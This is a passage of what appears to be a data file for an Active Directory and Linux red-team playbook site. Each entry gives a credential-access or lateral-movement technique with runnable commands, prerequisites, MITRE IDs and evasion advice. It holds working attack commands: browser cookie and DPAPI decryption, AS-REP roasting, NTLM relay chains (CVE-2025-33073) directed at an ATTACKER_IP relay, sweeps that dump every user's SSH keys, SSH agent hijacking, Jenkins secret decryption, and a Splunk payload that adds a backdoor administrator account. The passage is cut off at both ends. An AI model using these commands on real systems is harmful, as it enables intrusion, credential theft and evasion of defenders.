      { name: 'SharpChrome', url: 'https://github.com/GhostPack/SharpDPAPI' },
      { name: 'SharpDPAPI', url: 'https://github.com/GhostPack/SharpDPAPI' },
      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      {
        label: 'Chromium logins + cookies (pre-ABE only: /unprotect handles the v80-v126 DPAPI state key, not Chrome v127+ App-Bound Encryption)',
        code: r`SharpChrome.exe logins /unprotect
SharpChrome.exe cookies /unprotect /format:json`,
        lang: 'cmd',
      },
      { label: 'Firefox / Chrome / Edge creds (NSS + DPAPI)', code: r`nxc smb <host> -u <u> -p <p> --dpapi`, lang: 'bash' },
    ],
    mitre: mitre('T1555.003'),
    references: [
      { label: 'GhostPack, SharpDPAPI / SharpChrome', url: 'https://github.com/GhostPack/SharpDPAPI' },
      {
        label: 'HackTricks, DPAPI: Extracting Passwords',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html',
      },
      {
        label: 'Google Security Blog, Improving the security of Chrome cookies on Windows (App-Bound Encryption)',
        url: 'https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html',
      },
    ],
    requires: [
      "Self-user, pre-ABE: code execution as the target user (SharpChrome /unprotect decrypts their own secrets, no elevation)",
      "Another user's blobs, or bypassing App-Bound Encryption via IElevator: local admin / SYSTEM",
    ],
    opsec:
      'Reading a locked browser DB can fail while the browser runs; cookie reuse from a new device/IP may trip impossible-travel / conditional-access. A legacy DPAPI cookie read is quiet, but the Chrome v127+ App-Bound Encryption bypass (IElevator COM, injection into chrome.exe, or a debugger) is comparatively loud and EDR-visible.',
  },
  {
    id: 'targeted-asrep',
    label: 'Targeted AS-REP Roasting',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'On a user you can write, set DONT_REQ_PREAUTH, then AS-REP roast and crack them offline.',
    description:
      "The AS-REP analogue of targeted Kerberoasting: with GenericAll/GenericWrite over a victim, flip the DONT_REQ_PREAUTH userAccountControl bit so the KDC issues a pre-auth-free AS-REP encrypted with the victim's key. Roast it, crack offline, then revert the flag.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'Impacket (GetNPUsers)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      {
        label: 'Flip UAC, roast, revert',
        code: r`bloodyAD -u <u> -p <p> -d <domain> --host <dc> add uac <victim> -f DONT_REQ_PREAUTH
GetNPUsers.py <domain>/<victim> -no-pass -request -format hashcat -outputfile asrep.txt
bloodyAD -u <u> -p <p> -d <domain> --host <dc> remove uac <victim> -f DONT_REQ_PREAUTH`,
        lang: 'bash',
      },
      { label: 'Crack', code: r`hashcat -m 18200 asrep.txt wordlist.txt`, lang: 'bash' },
    ],
    mitre: mitre('T1558.004'),
    references: [
      {
        label: 'HackTricks, ASREPRoast',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html',
      },
      { label: 'bloodyAD, User Guide', url: 'https://github.com/CravateRouge/bloodyAD/wiki/User-Guide' },
      { label: 'harmj0y, Roasting AS-REPs (Will Schroeder, original research)', url: 'https://blog.harmj0y.net/activedirectory/roasting-as-reps/' },
    ],
    requires: ['GenericAll / GenericWrite (userAccountControl) over the target user'],
    opsec:
      'Toggling UAC (event 4738) is detectable, and the pre-auth-free request logs on the DC as event 4768 (TGT requested) with Pre-Authentication Type 0; revert the flag promptly. Cracking is offline and invisible.',
  },
  {
    id: 'mssql-exec',
    aliases: ['SQLAdmin'],
    label: 'MSSQL Command Execution',
    phase: 'lateral-movement',
    needs: 'creds',
    summary: 'Log in to MSSQL and get host RCE as the SQL service account via xp_cmdshell (or OLE / Agent).',
    description:
      "A SQL login with sysadmin (or an impersonation path to it) can enable and run xp_cmdshell, executing OS commands as the SQL Server service account. Since SQL Server 2012 the default install runs under the low-privilege per-service virtual account (NT SERVICE\\MSSQLSERVER for the default instance), which is not SYSTEM and not a local admin but holds SeImpersonatePrivilege, so it is a potato (token-impersonation) path to SYSTEM rather than SYSTEM already. It is only an admin/SYSTEM foothold when the service was configured to run as a privileged account. OLE automation and the SQL Agent are quieter alternatives to xp_cmdshell.",
    tools: [
      { name: 'NetExec (mssql)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'Impacket (mssqlclient)', url: 'https://github.com/fortra/impacket' },
      { name: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
    ],
    commands: [
      {
        label: 'xp_cmdshell RCE',
        code: r`mssqlclient.py <domain>/<user>@<host> -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami`,
        lang: 'bash',
      },
      { label: 'One-liner (NetExec)', code: r`nxc mssql <host> -u <u> -p <p> -x "whoami"`, lang: 'bash' },
    ],
    mitre: mitre('T1059'),
    references: [
      { label: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
      {
        label: 'HackTricks, Pentesting MSSQL',
        url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html',
      },
    ],
    requires: ['A SQL login with sysadmin or an impersonation path on a reachable MSSQL instance'],
    opsec:
      'Enabling xp_cmdshell and the spawned process are logged (SQL audit / Sysmon 4688). OLE automation (sp_OACreate) is quieter; revert sp_configure changes.',
  },
  {
    id: 'tgt-harvest',
    label: 'TGT / Ticket Harvesting',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'On a host you control, continuously export TGTs from LSASS as users log on: a stream of reusable tickets.',
    description:
      "Rather than a one-shot LSASS dump, passively monitor a controlled host and export each new logon's TGTs as they arrive (Rubeus monitor/harvest are TGT-only; a one-shot mimikatz sekurlsa::tickets /export also captures service tickets/TGS). Interactive/RemoteInteractive/RDP logons, batch/scheduled-task and service logons running as the account, and any auth to a host with unconstrained delegation cache a reusable TGT you can pass as that user. Plain network (type 3) logons (inbound SMB/RPC service connections) authenticate and discard, leaving nothing to harvest, so on a normal file or jump server you mostly collect tickets from people who log on interactively (or via delegation).",
    tools: [
      { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      { name: 'mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      {
        label: 'Harvest new TGTs in a bounded window (harvest = monitor + auto-renewal; /runfor caps the run)',
        code: r`Rubeus.exe harvest /interval:60 /runfor:600 /nowrap`,
        lang: 'cmd',
      },
      { label: 'Export all tickets (mimikatz)', code: r`sekurlsa::tickets /export`, lang: 'cmd' },
    ],
    mitre: mitre('T1558'),
    references: [
      { label: 'GhostPack, Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
      {
        label: 'HackTricks, Pass the Ticket',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html',
      },
    ],
    requires: ['Local admin / SYSTEM on a host where other users authenticate'],
    opsec:
      'A long-running process reading LSASS is high-signal to EDR; favour short harvest windows on busy hosts (jump servers, Citrix, admin workstations).',
  },
  {
    id: 'ntlmv1-downgrade',
    label: 'NTLMv1 Downgrade → NT Hash',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Force NetNTLMv1, capture it with a chosen challenge, and crack it to the NT hash in minutes via DES / crack.sh.',
    description:
      "Where LmCompatibilityLevel still allows NTLMv1, capture or coerce a machine/user NetNTLMv1 response using the fixed challenge 1122334455667788 and crack it to the raw NT hash (DES is broken). crack.sh's non-ESS fixed-challenge rainbow table is free but the service is intermittently down, and ESS/SSP or non-table jobs cost money; alternatives are shuck.sh, hashcat -m 14000, or the public NetNTLMv1 rainbow tables. Recovering a DC or computer account's NT hash this way bridges straight to silver tickets, RBCD or DCSync, with no password needed.",
    tools: [
      { name: 'Responder', url: 'https://github.com/lgandx/Responder' },
      { name: 'NetExec (ntlmv1)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'hashcat', url: 'https://hashcat.net/hashcat/' },
    ],
    commands: [
      { label: 'Check NTLMv1 allowed (module; needs local admin)', code: r`nxc smb <host> -u <u> -p <p> -M ntlmv1`, lang: 'bash' },
      {
        label: 'Capture (fixed challenge) + recover the NT hash',
        code: r`# Responder.conf: Challenge = 1122334455667788
responder -I eth0 --lm --disable-ess   # --disable-ess strips Extended Session Security; with ESS the free fixed-challenge rainbow table does not apply (use -m 14000 / shucking / crack.sh's SSP path)
# submit the NetNTLMv1 to crack.sh (DES rainbow -> NT hash), or recover the NT hash locally:
hashcat -m 14000 -a 3 netntlmv1.txt <DES-mask>   # KPA on the two DES keys, then regenerate the NT hash
hashcat -m 27000 -a 0 netntlmv1.txt nt-hashes.txt # NT-hash shucking with an NT-hash wordlist`,
        lang: 'bash',
      },
    ],
    mitre: mitre('T1110.002'),
    references: [
      { label: 'crack.sh, NetNTLMv1 cracking', url: 'https://crack.sh/' },
      { label: 'HackTricks, NTLM', url: 'https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html' },
      { label: 'NotMedic, NetNTLMtoSilverTicket (canonical NTLMv1 downgrade to silver ticket)', url: 'https://github.com/NotMedic/NetNTLMtoSilverTicket' },
      { label: 'TrustedSec, Practical Attacks against NTLMv1', url: 'https://www.trustedsec.com/blog/practical-attacks-against-ntlmv1/' },
    ],
    requires: ['A target allowing NTLMv1 (LmCompatibilityLevel <= 2) + ability to capture/coerce its auth'],
    opsec:
      'Forcing a downgrade and capturing auth is detectable; the payoff is fast offline NT-hash recovery for the non-ESS rainbow-table case (ESS/SSP or non-table jobs are slower and cost money). Many environments still allow NTLMv1 on legacy hosts.',
  },
  {
    id: 'ntlm-reflection',
    label: 'NTLM Reflection (CVE-2025-33073)',
    phase: 'priv-esc',
    needs: 'domain-user',
    summary: 'Coerce a host to a marshalled DNS name so its SYSTEM auth reflects back to its own SMB.',
    description:
      "CVE-2025-33073: Windows blocks the classic reflection (an SMB client authenticating back to the host that coerced it), but Synacktiv found the check is bypassed when the victim is coerced to a name that carries MARSHALLED target info. Add an ADIDNS record whose name ends in the marshalled blob (e.g. `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`; the prefix can be the victim's short hostname or 'localhost', which works against any vulnerable host once the blob is stripped) pointing at you; coerce the victim to it, and LSASS strips the marshalled blob (lsasrv!LsapCheckMarshalledTargetInfo) so the SMB client matches only the bare hostname and wrongly concludes the connection is local, so LSASS (SYSTEM) authenticates to your relay, which bounces it straight back to the victim's own SMB. An unprivileged domain user gets SYSTEM on any host not enforcing SMB signing. Patched Jun 2025 (the patch adds a CredUnmarshalTargetInfo call in mrxsmb!SmbCeCreateSrvCall that refuses the connection once a marshalled target name is detected); enforcing SMB signing also mitigates.",
    tools: [
      { name: 'krbrelayx (dnstool)', url: 'https://github.com/dirkjanm/krbrelayx' },
      { name: 'Impacket (ntlmrelayx)', url: 'https://github.com/fortra/impacket' },
      { name: 'Coercer', url: 'https://github.com/p0dalirius/Coercer' },
      { name: 'NetExec (ntlm_reflection)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Check if a host is vulnerable (NetExec)', code: r`nxc smb <host> -u user -p pass -M ntlm_reflection`, lang: 'bash' },
      {
        label: '1. Add the marshalled-name ADIDNS record (the bypass)',
        code: r`python3 dnstool.py -u 'DOMAIN\user' -p 'pass' -a add \
  -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d <ATTACKER_IP> <DC_IP>`,
        lang: 'bash',
      },
      { label: '2. Relay the reflected auth to the victim itself', code: r`ntlmrelayx.py -t <VICTIM_IP> -smb2support`, lang: 'bash' },
      {
        label: '3. Coerce the victim to the marshalled name (its SYSTEM token reflects)',
        code: r`coercer coerce -u user -p pass -d domain.local -t <VICTIM_IP> -l 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'`,
        lang: 'bash',
      },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'Synacktiv, NTLM reflection is dead, long live NTLM reflection (CVE-2025-33073)', url: 'https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025' },
      { label: 'NVD, CVE-2025-33073', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-33073' },
    ],
    requires: ['A coercible target without enforced SMB signing (unpatched, pre Jun-2025)'],
    opsec:
      'Coercion + relay traffic is detectable; SMB signing or the 2025 patch fully blocks it. Self-reflection avoids the cross-host relay signature.',
  },
  {
    id: 'bitlocker-recovery',
    label: 'BitLocker Recovery Key Extraction',
    phase: 'credential-access',
    needs: 'domain-user',
    summary: 'Read msFVE-RecoveryInformation from AD to unlock seized, offline or dual-booted volumes.',
    description:
      "Where BitLocker recovery keys are escrowed to AD, anyone able to read msFVE-RecoveryInformation on computer objects (delegated, or a DA) can recover the 48-digit recovery password and decrypt any offline volume: exposing NTDS.dit on a stolen DC disk, or the SAM and files on a recovered laptop. A pure directory read, like LAPS.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView / Get-ADObject', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'manage-bde', url: 'https://ss64.com/nt/manage-bde.html' },
    ],
    commands: [
      { label: 'Pull recovery keys from AD over LDAP (bloodyAD)', code: r`bloodyAD --host dc01 -d domain.local -u user -p pass get search --filter '(objectClass=msFVE-RecoveryInformation)' --attr msFVE-RecoveryPassword`, lang: 'bash' },
      {
        label: 'Native LDAP read (RSAT)',
        code: r`Get-ADObject -Filter "objectClass -eq 'msFVE-RecoveryInformation'" -Properties msFVE-RecoveryPassword`,
        lang: 'powershell',
      },
    ],
    mitre: mitre('T1552'),
    references: [
      { label: 'bloodyAD (LDAP read/write)', url: 'https://github.com/CravateRouge/bloodyAD' },
      {
        label: 'Microsoft, BitLocker recovery overview',
        url: 'https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/recovery-overview',
      },
    ],
    requires: ['Read access to msFVE-RecoveryInformation in AD (delegated or DA) + a seized/offline volume'],
    opsec:
      'Reading recovery keys is a quiet LDAP query; the loud part is physically obtaining the volume. Useful against stolen backups/laptops where online attacks do not apply.',
  },
  {
    id: 'linux-host-secrets',
    label: 'Linux Host Secrets (keytab/ccache)',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Loot Kerberos keytabs, ticket caches & SSSD cache on domain-joined Linux.',
    description:
      "Domain-joined Linux (SSSD, realmd, Samba, PBIS/Centrify) keeps Kerberos material on disk that Windows-only tooling never sees. /etc/krb5.keytab holds the host's machine-account key (service keytabs hold SPN keys), from which you extract the NT/AES hash; user credential caches (/tmp/krb5cc_*, $KRB5CCNAME, or the SSSD KCM store) are live tickets you can reuse directly; the SSSD cache splits two ways: /var/lib/sss/db/cache_<domain>.ldb holds cached credentials as salted 5000-iteration SHA-512 (one-way, offline-crack only, never pass-able), while /var/lib/sss/secrets is the KCM ticket store plus the machine-account secret (directly reusable). Root on one Linux box thus reaches domain accounts. ATT&CK-wise the keytab/SSSD-hash dumping is credential dumping (SSSD cached creds specifically T1003.005), while reusing a ccache ticket is ticket theft/reuse (T1558 Steal or Forge Kerberos Tickets), not credential dumping.",
    tools: [
      { name: 'KeyTabExtract', url: 'https://github.com/sosdave/KeyTabExtract' },
      { name: 'LinikatzV2 (maintained rewrite)', url: 'https://github.com/Orange-Cyberdefense/LinikatzV2' },
      { name: 'Linikatz (original, ~2016)', url: 'https://github.com/CiscoCXSecurity/linikatz' },
      { name: 'ticketConverter (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'List + extract a keytab (NTLM hash is the reliable output; AES256/128 recovery depends on the keytab enctypes, use the hakaioffsec/keytabextractor fork for AES keys)', code: r`klist -ke /etc/krb5.keytab
python3 keytabextract.py /etc/krb5.keytab`, lang: 'bash' },
      { label: 'Reuse a user ccache (pass-the-ticket); /tmp path is the legacy FILE cache', code: r`export KRB5CCNAME=/tmp/krb5cc_1000; klist
# modern SSSD (RHEL 8+/Fedora) defaults to KCM, so /tmp/krb5cc_<UID> is empty:
KRB5CCNAME=KCM: klist   # or loot the KCM store at /var/lib/sss/secrets`, lang: 'bash' },
      { label: 'Automated harvest', code: r`./linikatz.sh`, lang: 'bash' },
    ],
    requires: ['root on a domain-joined Linux host'],
    mitre: mitre('T1003'),
    opsec: 'Reading keytab/ccache/SSSD files is quiet local file access (auditd may log reads of /etc/krb5.keytab if configured). Reused ccache tickets look like ordinary Kerberos traffic.',
    references: [
      { label: 'HackTricks, Harvesting Tickets from Linux', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.html' },
      { label: 'BlackHat EU 2018, Where 2 Worlds Collide: Bringing Mimikatz et al to UNIX (Tim Wadhwa-Brown, Cisco/Portcullis, Linikatz origin)', url: 'https://i.blackhat.com/eu-18/Wed-Dec-5/eu-18-Wadhwa-Brown-Where-2-Worlds-Collide-Bringing-Mimikatz-et-al-to-UNIX.pdf' },
    ],
  },
  {
    id: 'dpapi-machine-secrets',
    label: 'Machine DPAPI Secrets',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Decrypt SYSTEM-scoped DPAPI: service/task/WiFi creds and machine cert keys.',
    description:
      "DPAPI's machine scope protects secrets owned by the computer rather than a user, unlocked by the DPAPI_SYSTEM LSA secret you hold as SYSTEM/local admin. Decrypting the machine master keys recovers credentials saved by services and scheduled tasks, WiFi PSKs, and, most usefully, machine certificate private keys (which enable PKINIT / certificate auth as the host). Distinct from the per-user DPAPI layer and the domain backup key.",
    tools: [
      { name: 'SharpDPAPI', url: 'https://github.com/GhostPack/SharpDPAPI' },
      { name: 'DonPAPI', url: 'https://github.com/login-securite/DonPAPI' },
      { name: 'dpapi.py (Impacket)', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Machine master keys + credentials', code: r`SharpDPAPI.exe machinemasterkeys
SharpDPAPI.exe machinecredentials`, lang: 'cmd' },
      { label: 'Machine certificate private keys', code: r`SharpDPAPI.exe certificates /machine`, lang: 'cmd' },
      { label: 'WiFi PSKs (SharpDPAPI has no wifi module; use dploot / DonPAPI / mimikatz)', code: r`dploot wifi -target <host> -u <u> -p <p>   # or mimikatz: dpapi::wifi`, lang: 'bash' },
    ],
    requires: ['SYSTEM / local admin on the host (for the DPAPI_SYSTEM key)'],
    mitre: mitre('T1552.004'),
    opsec: 'Reading machine master keys + LSA secrets touches SYSTEM-protected stores EDR watches, and SharpDPAPI is signatured; but it recovers material LSASS never holds (service creds, cert private keys) without scraping LSASS.',
    references: [
      { label: 'HackTricks, DPAPI: Extracting Passwords', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html' },
    ],
  },
  {
    id: 'linux-cred-hunt',
    label: 'Linux Credential Hunting',
    phase: 'credential-access',
    needs: 'shell',
    summary: 'Sweep a Linux host for SSH keys, history, config secrets & in-memory creds.',
    description:
      "Once you can read a Linux host, sweep for reusable secrets: SSH private keys (~/.ssh/id_*, and authorized_keys/known_hosts to map pivots), shell history (.bash_history/.zsh_history), config and .env files under /etc, /var/www and /opt, database creds (~/.pgpass, ~/.my.cnf), mounted-share creds (/etc/fstab, cifs credential files), the GNOME keyring / KWallet keyring files (~/.local/share/keyrings, KWallet .kwl), and cleartext passwords still in memory (mimipenguin, but it is largely legacy: it works mainly on older Ubuntu/Debian desktops with GNOME Keyring <=3.28 and is effectively dead on modern GDM3/Wayland, so prefer keyring-file harvesting or LaZagne there). On a domain-joined host also grab Kerberos material: credential caches (/tmp/krb5cc_*, KEYRING/KCM) are live tickets to pass, and keytabs (/etc/krb5.keytab, app keytabs) yield the account key. SSH private keys are the prize: they pivot with no password.",
    tools: [
      { name: 'LinPEAS (PEASS-ng)', url: 'https://github.com/peass-ng/PEASS-ng' },
      { name: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
      { name: 'mimipenguin', url: 'https://github.com/huntergregal/mimipenguin' },
    ],
    commands: [
      { label: 'SSH keys, history & mounted-share creds', code: r`find / -name 'id_*' ! -name '*.pub' -readable 2>/dev/null -exec cat {} +   # every user's private keys, skips .pub
cat ~/.bash_history /etc/fstab ~/.pgpass ~/.my.cnf 2>/dev/null`, lang: 'bash' },
      { label: 'Kerberos ccaches & keytabs (domain-joined)', code: r`ls -la /tmp/krb5cc_* /etc/krb5.keytab 2>/dev/null; cp /tmp/krb5cc_* /tmp/ 2>/dev/null
klist -kte /etc/krb5.keytab`, lang: 'bash' },
      { label: 'Grep configs for secrets', code: r`grep -rIn -E "pass(word)?|secret|api[_-]?key|token" /etc /var/www /opt 2>/dev/null`, lang: 'bash' },
      { label: 'Cleartext creds in memory + automated sweep', code: r`sudo python3 mimipenguin.py
./linpeas.sh -e`, lang: 'bash' },
    ],
    requires: ["Read access to the host (root for /etc/shadow, other users' keys, and process memory)"],
    mitre: mitre('T1552.004'),
    opsec: 'Mostly quiet file reads; mimipenguin and LinPEAS touch many paths / process memory and are AV-signatured on hardened Linux. Prefer targeted reads on monitored hosts.',
    references: [
      { label: 'HackTricks, Linux Privilege Escalation', url: 'https://hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html' },
      { label: 'PayloadsAllTheThings, Linux Privilege Escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
  },
  {
    id: 'ssh-hijack',
    label: 'SSH Session Hijacking',
    phase: 'lateral-movement',
    needs: 'local-admin',
    summary: 'Ride a live ControlMaster socket or forwarded ssh-agent: no creds needed.',
    description:
      "On a host where a user holds active SSH sessions, pivot as them without their password or key. OpenSSH ControlMaster multiplexing leaves a control socket you can reuse to open new channels over their authenticated connection; and a forwarded ssh-agent (SSH_AUTH_SOCK) lets you sign authentications onward to any host the user can reach. Both inherit the victim's identity silently.",
    tools: [
      { name: 'OpenSSH client', url: 'https://www.openssh.org/' },
    ],
    commands: [
      { label: 'Ride a ControlMaster socket', code: r`ls -la ~/.ssh/ /tmp 2>/dev/null | grep -iE 'ctl|master|mux'
ssh -S /home/victim/.ssh/cm-victim@10.0.0.50:22 victim@10.0.0.50`, lang: 'bash' },
      { label: 'Hijack a forwarded ssh-agent', code: r`# OpenSSH 10.1 (Oct 2025) moved agent sockets out of /tmp to ~/.ssh/agent, so cover both:
export SSH_AUTH_SOCK=$(find /tmp ~/.ssh/agent /home/*/.ssh/agent -path '*ssh-*/agent.*' -o -path '*/.ssh/agent/*' 2>/dev/null | head -1)
# version-independent fallback: read SSH_AUTH_SOCK live from a victim process
grep -a SSH_AUTH_SOCK /proc/*/environ 2>/dev/null
ssh-add -l && ssh victim@next-host`, lang: 'bash' },
    ],
    requires: ['root (or the session owner) on a host with an active ControlMaster socket or forwarded ssh-agent'],
    mitre: mitre('T1563.001'),
    opsec: "No new authentication: you reuse the victim's live session/agent, so there is no password prompt and no key on disk (very quiet). Agent forwarding to untrusted hosts is the root misconfiguration.",
    references: [
      { label: 'HackTricks, Pentesting SSH', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html' },
      { label: 'Embrace The Red, TTP Diaries: SSH Agent Hijacking', url: 'https://embracethered.com/blog/posts/2022/ttp-diaries-ssh-agent-hijacking/' },
      { label: 'Graham Helton, Abusing SSH-Agent for Lateral Movement', url: 'https://grahamhelton.com/blog/ssh-agent' },
    ],
  },
  {
    id: 'devops-secrets',
    label: 'DevOps & CI/CD Secrets',
    phase: 'credential-access',
    needs: 'local-admin',
    summary: 'Loot deploy/admin creds from Ansible, Jenkins, Artifactory & CI runners.',
    description:
      "CI/CD and config-management servers hoard privileged, reusable credentials (deploy and service accounts, often domain-privileged). Ansible controllers leak creds in playbooks, group_vars and ansible.cfg (and ansible-vault blobs once you find the key); Jenkins stores them in credentials.xml decryptable with master.key + hudson.util.Secret (or via the Groovy console); Artifactory/Nexus keep them in config DBs and backups; GitLab/GitHub runners expose CI variables and Terraform state (.tfstate). One such server is frequently a fast tier-0 route that never touches a DC.",
    tools: [
      { name: 'jenkins-credentials-decryptor', url: 'https://github.com/hoto/jenkins-credentials-decryptor' },
      { name: 'gquere, pwn_jenkins', url: 'https://github.com/gquere/pwn_jenkins' },
      { name: 'trufflehog', url: 'https://github.com/trufflesecurity/trufflehog' },
    ],
    commands: [
      { label: 'Loot Ansible playbooks / vault', code: r`grep -rIn -E "ansible_(password|become_pass)|vault" /etc/ansible /opt 2>/dev/null
ansible-vault view group_vars/all/vault.yml`, lang: 'bash' },
      { label: 'Decrypt Jenkins stored credentials', code: r`./jenkins-credentials-decryptor -m $JENKINS_HOME/secrets/master.key -s $JENKINS_HOME/secrets/hudson.util.Secret -c $JENKINS_HOME/credentials.xml -o json`, lang: 'bash' },
    ],
    requires: ['Access to a CI/CD or config-management server (Ansible controller, Jenkins, Artifactory/Nexus, GitLab runner)'],
    mitre: mitre('T1552.001'),
    opsec: 'These servers are high-value yet often under-monitored, and the recovered deploy/service accounts are frequently privileged across many hosts: fast and quiet compared with dumping a DC.',
    references: [
      { label: 'Ansible, Protecting secrets with Vault', url: 'https://docs.ansible.com/ansible/latest/vault_guide/index.html' },
      { label: 'gquere, pwn_jenkins (Jenkins post-exploitation)', url: 'https://github.com/gquere/pwn_jenkins' },
    ],
  },
  {
    id: 'jea-breakout',
    label: 'JEA Endpoint Breakout',
    phase: 'lateral-movement',
    needs: 'domain-user',
    summary: 'Escape a constrained PowerShell (JEA) admin endpoint to the RunAs identity.',
    description:
      "Just Enough Administration (JEA) exposes a constrained PowerShell remoting endpoint that executes as a privileged virtual / RunAs account while restricting the caller to whitelisted functions in NoLanguage mode. Enumerate the visible functions for ones that wrap arbitrary execution (Invoke-Expression, Start-Process, external binaries, or a -ScriptBlock parameter), or escape the constrained runspace, to run commands as the privileged RunAs identity: a local-to-admin jump on that host. If the JEA endpoint is hosted on a domain controller, that RunAs identity is effectively SYSTEM on the DC, so a breakout there is a direct domain compromise rather than a single-host jump.",
    requires: ['Credentials that map to a JEA (constrained PowerShell remoting) endpoint'],
    commands: [
      { label: 'Inspect the endpoint (visible functions + language mode)', code: r`Get-PSSessionConfiguration | Select Name, RunAsUser
Enter-PSSession -ComputerName 10.0.0.20 -ConfigurationName JEAMaintenance
Get-Command -CommandType Function; $ExecutionContext.SessionState.LanguageMode`, lang: 'powershell' },
    ],
    mitre: mitre('T1059.001'),
    opsec: 'Transcription (TranscriptDirectory in the .pssc) and module logging are optional, not automatic on every JEA endpoint; where the admin has enabled them, breakout commands stand out against the whitelisted baseline, so first check whether logging is configured. The usual escape is a visible function that shells out (Invoke-Expression / external binary) rather than a runspace escape.',
    references: [
      { label: 'Microsoft, Just Enough Administration overview', url: 'https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview' },
      { label: 'Microsoft, JEA security considerations', url: 'https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/security-considerations' },
      { label: 'scriptjunkie, Just Too Much Administration: Breaking JEA', url: 'https://scriptjunkie.us/2016/10/just-too-much-administration-breaking-jea-powershells-new-security-barrier/' },
      { label: 'NewEraSec, JEA breakout notes', url: 'https://infra.newerasec.com/infrastructure-testing/breakout/just-enough-administration-jea' },
    ],
  },
  {
    id: 'splunk-abuse',
    label: 'Splunk Forwarder Abuse',
    phase: 'lateral-movement',
    needs: 'creds',
    summary: 'Push a forwarder bundle → SYSTEM on every Splunk-monitored host.',
    description:
      "Splunk aggregates logs from a Universal Forwarder agent installed across the estate. With access to the Splunk deployment server (admin, or via forwarders that do not verify the server's TLS certificate, a MITM), push a malicious app bundle whose scripted input executes as the forwarder service account on every managed endpoint at once. That account was historically Local System/SYSTEM, but UF 9.1+ (2023) defaults to a least-privileged virtual account (NT SERVICE\\SplunkForwarder); SYSTEM only if the installer's Local System option was chosen. SplunkWhisperer2 also turns a single forwarder with a writable input config into local RCE / privesc. An estate-wide foothold in the same class as SCCM and WSUS deployment abuse.",
    tools: [
      { name: 'SplunkWhisperer2', url: 'https://github.com/cnotin/SplunkWhisperer2' },
    ],
    commands: [
      { label: 'Remote: install a malicious app on a forwarder via its REST API (creds required; one host, not a deployment-server fan-out)', code: r`python3 PySplunkWhisperer2_remote.py --host 10.0.0.40 --lhost 10.0.0.66 --username admin --password 'Password1' --payload 'net user pwn P@ss123! /add'`, lang: 'bash' },
      { label: 'Local: install a malicious app via the local forwarder REST API (needs Splunk creds or local access to it, not a writable config)', code: r`python3 PySplunkWhisperer2_local.py --payload 'cmd /c net localgroup administrators pwn /add'`, lang: 'bash' },
    ],
    requires: ['Access to the Splunk deployment server (admin creds, or forwarders that skip server-cert verification), or Splunk creds / local access to a single forwarder REST API (8089)'],
    mitre: mitre('T1072'),
    opsec: "Pushing an app is loud in Splunk's own logs. The per-forwarder SplunkWhisperer2 commands shown here hit a single --host and are logged on that host/indexer; the many-hosts-at-once blast radius belongs to the deployment-server variant that fans an app out estate-wide, so target selectively there. The scripted input spawns from splunkd as the forwarder service account (SYSTEM on pre-9.1 or Local-System installs, otherwise the least-privileged NT SERVICE\\SplunkForwarder virtual account), which EDR flags.",
    references: [
      { label: 'Eapolsniper, Abusing Splunk Forwarders for RCE & Persistence', url: 'https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/' },
      { label: 'HackTricks, Pentesting Splunk (8089)', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/8089-splunkd.html' },
    ],
  },
  {
    id: 'config-mgmt-abuse',
    label: 'Config Mgmt & RMM Abuse',
    phase: 'lateral-movement',
    needs: 'domain-user',
